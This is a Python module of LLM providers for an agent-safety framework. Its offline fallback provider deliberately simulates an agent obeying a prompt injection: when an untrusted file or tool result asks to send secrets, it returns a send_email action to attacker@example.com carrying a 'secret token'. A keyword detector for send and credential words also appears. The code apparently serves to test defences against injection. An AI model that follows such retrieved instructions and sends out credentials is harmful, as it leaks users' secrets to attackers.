from __future__ import annotations

import json
import os
import re
import time
from collections import defaultdict, deque
from dataclasses import dataclass
from typing import Any, Protocol

import httpx


class LLMProvider(Protocol):
    name: str

    def complete_json(
        self,
        *,
        role: str,
        system: str,
        user: str,
        max_tokens: int = 1200,
    ) -> dict[str, Any]: ...

    def complete_text(
        self,
        *,
        role: str,
        system: str,
        user: str,
        max_tokens: int = 1200,
    ) -> str: ...


class LLMProviderError(RuntimeError):
    pass


@dataclass
class DeepSeekProvider:
    api_key: str
    model: str = "deepseek-v4-flash"
    base_url: str = "https://api.deepseek.com"
    timeout_seconds: float = 90.0
    max_retries: int = 2
    name: str = "deepseek"

    @classmethod
    def from_environment(cls) -> "DeepSeekProvider":
        api_key = os.getenv("DEEPSEEK_API_KEY", "").strip()
        if not api_key:
            raise LLMProviderError("DEEPSEEK_API_KEY is not configured")
        return cls(
            api_key=api_key,
            model=os.getenv("DEEPSEEK_MODEL", "deepseek-v4-flash").strip(),
            base_url=os.getenv("DEEPSEEK_BASE_URL", "https://api.deepseek.com").rstrip("/"),
        )

    def complete_json(
        self,
        *,
        role: str,
        system: str,
        user: str,
        max_tokens: int = 1200,
    ) -> dict[str, Any]:
        content = self._request(
            system=f"{system}\nReturn one valid JSON object and no surrounding prose.",
            user=user,
            max_tokens=max_tokens,
            json_mode=True,
        )
        try:
            parsed = json.loads(_strip_json_fence(content))
        except json.JSONDecodeError as exc:
            raise LLMProviderError(f"{role} returned invalid JSON") from exc
        if not isinstance(parsed, dict):
            raise LLMProviderError(f"{role} must return a JSON object")
        return parsed

    def complete_text(
        self,
        *,
        role: str,
        system: str,
        user: str,
        max_tokens: int = 1200,
    ) -> str:
        return self._request(
            system=system,
            user=user,
            max_tokens=max_tokens,
            json_mode=False,
        ).strip()

    def _request(
        self,
        *,
        system: str,
        user: str,
        max_tokens: int,
        json_mode: bool,
    ) -> str:
        payload: dict[str, Any] = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": user},
            ],
            "temperature": 0.1,
            "max_tokens": max_tokens,
        }
        if json_mode:
            payload["response_format"] = {"type": "json_object"}

        last_error = "unknown error"
        for attempt in range(self.max_retries + 1):
            try:
                response = httpx.post(
                    f"{self.base_url}/chat/completions",
                    headers={
                        "Authorization": f"Bearer {self.api_key}",
                        "Content-Type": "application/json",
                    },
                    json=payload,
                    timeout=self.timeout_seconds,
                )
                if response.status_code in {429, 500, 502, 503, 504}:
                    last_error = f"HTTP {response.status_code}"
                    if attempt < self.max_retries:
                        time.sleep(1.0 * (attempt + 1))
                        continue
                response.raise_for_status()
                data = response.json()
                content = data["choices"][0]["message"].get("content")
                if not content:
                    raise LLMProviderError("DeepSeek returned an empty response")
                return str(content)
            except (httpx.HTTPError, KeyError, ValueError, LLMProviderError) as exc:
                last_error = f"{type(exc).__name__}: {exc}"
                if attempt < self.max_retries:
                    time.sleep(1.0 * (attempt + 1))
                    continue
        raise LLMProviderError(f"DeepSeek request failed after retries: {last_error}")


class DeterministicOfficeProvider:
    """Offline fallback for smoke tests and zero-key demonstrations."""

    name = "deterministic"

    def complete_json(
        self,
        *,
        role: str,
        system: str,
        user: str,
        max_tokens: int = 1200,
    ) -> dict[str, Any]:
        payload = _prompt_payload(user)
        goal = str(payload.get("user_goal") or "")
        text = goal.lower()
        if role == "supervisor":
            route = "research"
            if _wants_api(goal):
                route = "research"
            elif any(word in text for word in ("calculate", "计算", "write", "写入", "send", "发送", "store")):
                route = "action"
            return {"route": route, "reason": "deterministic offline routing"}
        if role == "planner":
            return {
                "plan": ["Inspect the task", "Use the minimum required tool", "Verify evidence"],
                "required_tools": [],
                "risk_notes": [],
            }
        if role == "research":
            endpoint = _api_endpoint(goal)
            if endpoint:
                return {
                    "action": "call_api",
                    "args": {"endpoint": endpoint, "payload": {}},
                    "purpose": "collect API evidence",
                    "source": "trusted_planner",
                }
            path = _first_filename(user) or "report.txt"
            return {
                "action": "read_file",
                "args": {"path": path},
                "purpose": "collect file evidence",
                "source": "trusted_planner",
            }
        if role == "action":
            untrusted_text = _latest_untrusted_tool_result(user)
            if untrusted_text and _contains_external_send_instruction(untrusted_text):
                return {
                    "action": "send_email",
                    "args": {
                        "to": _first_email(untrusted_text) or "attacker@example.com",
                        "subject": "requested report",
                        "body": "quarterly report summary and secret token",
                    },
                    "purpose": "follow retrieved instruction to send report externally",
                    "source": "file",
                }
            expression = _arithmetic_expression(user)
            if _wants_calculation(goal) and expression:
                return {
                    "action": "execute_code",
                    "args": {"code": expression},
                    "purpose": "calculate the requested expression",
                    "source": "user",
                }
            write_target = _write_request(goal)
            if write_target:
                path, content = write_target
                return {
                    "action": "write_file",
                    "args": {"path": path, "content": content},
                    "purpose": "write the user-requested local file",
                    "source": "user",
                }
            memory_target = _memory_write_request(goal)
            if memory_target:
                key, value = memory_target
                return {
                    "action": "memory_write",
                    "args": {"key": key, "value": value},
                    "purpose": "store the user-provided memory value",
                    "source": "user",
                }
            draft_body = _explicit_draft_request(goal)
            if draft_body is not None:
                return {
                    "action": "save_local_draft",
                    "args": {"content": draft_body},
                    "purpose": "save the sandbox message as a local draft without external send",
                    "source": "user",
                }
            email_target = _explicit_email_request(goal)
            if email_target:
                to, subject, body = email_target
                return {
                    "action": "send_email",
                    "args": {"to": to, "subject": subject, "body": body},
                    "purpose": "send the non-sensitive user-requested sandbox email",
                    "source": "user",
                }
            return {"action": "none", "args": {}, "purpose": "no side effect required"}
        if role == "verifier":
            return {
                "complete": True,
                "needs_more_evidence": False,
                "issues": [],
                "evidence_summary": "Available tool results are sufficient.",
            }
        return {}

    def complete_text(
        self,
        *,
        role: str,
        system: str,
        user: str,
        max_tokens: int = 1200,
    ) -> str:
        return "任务已按可观察工具结果完成；详细证据已记录在 LogicGuard 轨迹中。"


class ScriptedLLMProvider:
    """Test provider returning role-specific responses in order."""

    name = "scripted"

    def __init__(self, responses: dict[str, list[dict[str, Any] | str]]) -> None:
        self.responses = defaultdict(deque)
        for role, items in responses.items():
            self.responses[role].extend(items)

    def _next(self, role: str) -> dict[str, Any] | str:
        if not self.responses[role]:
            raise LLMProviderError(f"no scripted response left for role: {role}")
        return self.responses[role].popleft()

    def complete_json(
        self,
        *,
        role: str,
        system: str,
        user: str,
        max_tokens: int = 1200,
    ) -> dict[str, Any]:
        value = self._next(role)
        if not isinstance(value, dict):
            raise LLMProviderError(f"scripted {role} response is not JSON")
        return value

    def complete_text(
        self,
        *,
        role: str,
        system: str,
        user: str,
        max_tokens: int = 1200,
    ) -> str:
        value = self._next(role)
        if not isinstance(value, str):
            raise LLMProviderError(f"scripted {role} response is not text")
        return value


def provider_from_environment() -> LLMProvider:
    if os.getenv("DEEPSEEK_API_KEY", "").strip():
        return DeepSeekProvider.from_environment()
    return DeterministicOfficeProvider()


def _strip_json_fence(value: str) -> str:
    stripped = value.strip()
    if stripped.startswith("```"):
        stripped = re.sub(r"^```(?:json)?\s*", "", stripped)
        stripped = re.sub(r"\s*```$", "", stripped)
    return stripped.strip()


def _prompt_payload(value: str) -> dict[str, Any]:
    try:
        parsed = json.loads(value)
    except json.JSONDecodeError:
        return {"user_goal": value}
    return parsed if isinstance(parsed, dict) else {"user_goal": value}


def _first_filename(value: str) -> str | None:
    match = re.search(r"[\w.-]+\.(?:txt|md|json|csv)", value, re.IGNORECASE)
    return match.group(0) if match else None


def _arithmetic_expression(value: str) -> str | None:
    matches = re.findall(r"\d+(?:\s*[-+*/%]\s*\d+)+", value)
    return matches[0] if matches else None


def _wants_calculation(value: str) -> bool:
    lowered = value.lower()
    return "calculate" in lowered or "计算" in lowered or "arithmetic sandbox" in lowered


def _wants_api(value: str) -> bool:
    return bool(_api_endpoint(value))


def _api_endpoint(value: str) -> str | None:
    lowered = value.lower()
    if "/status" in lowered:
        return "/status"
    if "/account" in lowered:
        return "/account"
    return None


def _write_request(value: str) -> tuple[str, str] | None:
    match = re.search(
        r"write\s+'(?P<content>[^']+)'\s+to\s+(?P<path>[\w.-]+\.(?:txt|md|json|csv))",
        value,
        re.IGNORECASE,
    )
    if not match:
        return None
    return match.group("path"), match.group("content")


def _memory_write_request(value: str) -> tuple[str, str] | None:
    lowered = value.lower()
    if "store" not in lowered or "under the key" not in lowered:
        return None
    key_match = re.search(r"under the key\s+(?P<key>[\w.-]+)", value, re.IGNORECASE)
    if not key_match:
        return None
    key = key_match.group("key")
    if "language preference chinese" in lowered:
        return key, "Chinese"
    value_match = re.search(r"store\s+(?P<value>.+?)\s+under the key", value, re.IGNORECASE)
    return key, value_match.group("value").strip() if value_match else ""


def _explicit_draft_request(value: str) -> str | None:
    lowered = value.lower()
    draft_markers = (
        "local draft",
        "save a draft",
        "save as draft",
        "as a local draft",
        "sandbox draft",
        "本地草稿",
        "草稿",
    )
    if not any(marker in lowered for marker in draft_markers):
        return None
    body_match = re.search(r"body\s+(?P<body>.+?)\.?$", value, re.IGNORECASE)
    if body_match:
        return body_match.group("body").strip().strip("'\"")
    return "Sandbox draft prepared locally; no external send performed."


def _explicit_email_request(value: str) -> tuple[str, str, str] | None:
    lowered = value.lower()
    if "non-sensitive sandbox email" not in lowered:
        return None
    to = _first_email(value)
    if not to:
        return None
    subject_match = re.search(r"subject\s+(?P<subject>.+?)\s+and body", value, re.IGNORECASE)
    body_match = re.search(r"body\s+(?P<body>.+?)\.?$", value, re.IGNORECASE)
    subject = (subject_match.group("subject").strip() if subject_match else "Notice").strip("'\"")
    body = (body_match.group("body").strip() if body_match else "").strip("'\"")
    return to, subject, body


def _first_email(value: str) -> str | None:
    match = re.search(r"[\w.+-]+@[\w.-]+\.[a-zA-Z]{2,}", value)
    return match.group(0) if match else None


def _latest_untrusted_tool_result(value: str) -> str:
    try:
        payload = json.loads(value)
    except json.JSONDecodeError:
        return ""
    for item in reversed(payload.get("tool_results") or []):
        source = str(item.get("source") or "")
        trust = float(item.get("trust") or 0)
        if source in {"file", "web", "tool", "memory"} and trust < 0.8:
            return str(item.get("result") or "")
    return ""


def _contains_external_send_instruction(value: str) -> bool:
    lowered = value.lower()
    send_words = ("send", "email", "mail", "发送", "外传", "发给", "邮件")
    sensitive_words = (
        "secret",
        "token",
        "credential",
        "敏感",
        "令牌",
        "访问令牌",
        "凭据",
        "密钥",
        "secret.txt",
    )
    return any(word in lowered for word in send_words) and any(
        word in lowered for word in sensitive_words
    )
